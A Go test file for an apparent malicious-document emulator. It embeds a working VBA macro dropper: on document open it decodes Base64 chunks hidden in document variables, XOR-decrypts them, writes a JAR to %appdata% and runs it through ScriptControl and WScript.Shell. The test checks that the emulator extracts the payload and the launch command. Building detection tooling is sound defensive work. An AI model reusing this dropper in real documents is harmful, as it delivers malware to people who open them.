package maldoctrace

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/base64"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/extractor"
	"github.com/debugactiveprocess/MaldocTrace/report"
)

// droppersVBA mirrors a document-variable dropper: Base64 chunks in document
// variables, decoded with MSXML's bin.base64 trick, XORed with a key turned
// into bytes by ADODB.Stream, written with SaveToFile and launched through
// JScript in ScriptControl with a WScript.Shell exposed by AddObject. It
// also exercises With blocks, ReDim on a Variant and "As Byte()" returns.
const dropperVBA = `Function getElement(ind)
    Dim strs
    ReDim strs(6)
    strs(0) = "bin"
    strs(1) = "MSXML"
    strs(2) = "base"
    strs(3) = 8 * 8
    strs(4) = "DOMDocument"
    strs(5) = "."
    getElement = strs(ind)
End Function

Function EncryptDecrypt(data() As Byte, key As String) As Byte()
    Dim resultBytes() As Byte
    Dim keyBytes
    Dim keyLength
    Dim i
    keyBytes = StringToBytes(key)
    keyLength = UBound(keyBytes) + 1
    ReDim resultBytes(UBound(data))
    For i = 0 To UBound(data)
        resultBytes(i) = data(i) Xor keyBytes(i Mod keyLength)
    Next
    EncryptDecrypt = resultBytes
End Function

Function StringToBytes(s As String) As Byte()
    With CreateObject("ADODB.Stream")
        .Type = 2
        .Charset = "utf-8"
        .Open
        .WriteText s
        .Position = 0
        .Type = 1
        .Position = 3
        StringToBytes = .Read
        .Close
    End With
End Function

Sub Document_Open()
    Dim size
    size = ThisDocument.Variables("chunkslen").Value
    Dim d As String
    Dim i As Long
    For i = 0 To size - 1
        d = d & CStr(ThisDocument.Variables("chunk" & i).Value)
    Next i
    Dim de() As Byte
    With CreateObject(getElement(1) & CStr(8 / 4) & getElement(5) & getElement(4)).CreateElement("n1n")
        .DataType = getElement(0) & getElement(5) & getElement(2) & CStr(getElement(3))
        .Text = d
        de = .NodeTypedValue
    End With
    Dim dec
    dec = EncryptDecrypt(de, CStr(ThisDocument.Variables("enckey").Value))
    Dim shellobj
    Set shellobj = CreateObject("wscript.shell")
    Dim pe
    pe = shellobj.expandenvironmentstrings("%appdata%") & "\" & CStr(ThisDocument.Variables("filename").Value)
    With CreateObject("ADODB.Stream")
        .Type = 1
        .Open
        .Write dec
        .SaveToFile pe
        .Close
    End With
    With CreateObject("MSScriptControl.ScriptControl")
        .Language = "JScript"
        .AddObject "oShell", shellobj, True
        .ExecuteStatement ("oShell.run(""java -jar \""" & Replace(pe, "\", "\\") & "\"""", 0, false);")
    End With
End Sub
`

func testJar(t *testing.T) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, _ := w.Create("META-INF/MANIFEST.MF")
	f.Write([]byte("Manifest-Version: 1.0\r\nMain-Class: demo.Main\r\n\r\n"))
	for _, n := range []string{"demo/Main.class", "demo/Util.class"} {
		f, _ = w.Create(n)
		f.Write([]byte{0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52})
	}
	w.Close()
	return buf.Bytes()
}

func TestDocumentVariableDropper(t *testing.T) {
	jar := testJar(t)
	key := "k3y"
	enc := make([]byte, len(jar))
	for i := range jar {
		enc[i] = jar[i] ^ key[i%len(key)]
	}
	b64 := base64.StdEncoding.EncodeToString(enc)
	half := len(b64) / 2
	res := &extractor.Result{
		Format:  extractor.FormatCFB,
		Modules: []*extractor.Module{{Name: "ThisDocument", FileName: "ThisDocument.cls", TypeName: "document/class/designer", Code: dropperVBA}},
		Properties: []extractor.DocProperty{
			{Name: "chunkslen", Value: "2", Kind: "variable"},
			{Name: "chunk0", Value: b64[:half], Kind: "variable"},
			{Name: "chunk1", Value: b64[half:], Kind: "variable"},
			{Name: "enckey", Value: key, Kind: "variable"},
			{Name: "filename", Value: "x.jar", Kind: "variable"},
		},
	}
	r := &report.Report{Status: "complete"}
	opts := Options{}
	opts.fill()
	runEmulation(context.Background(), res, r, opts)
	finalizeReport(r)
	if len(r.Commands) != 1 || r.Commands[0].CommandLine != `java -jar "%appdata%\x.jar"` {
		t.Fatalf("commands = %+v\ndiags=%+v", commandLines(r), r.Diagnostics)
	}
	if len(r.Artifacts) != 1 || !bytes.Equal(r.Artifacts[0].Raw, jar) {
		t.Fatalf("artifacts = %+v", r.Artifacts)
	}
	a := r.Artifacts[0]
	if a.FileType != "Java archive (JAR)" || !strings.Contains(strings.Join(a.Facts, ";"), "Main-Class=demo.Main") {
		t.Errorf("artifact = %s %v", a.FileType, a.Facts)
	}
	for _, e := range r.Events {
		if e.Type == "unresolved_call" {
			t.Errorf("unresolved call: %+v", e)
		}
	}
}
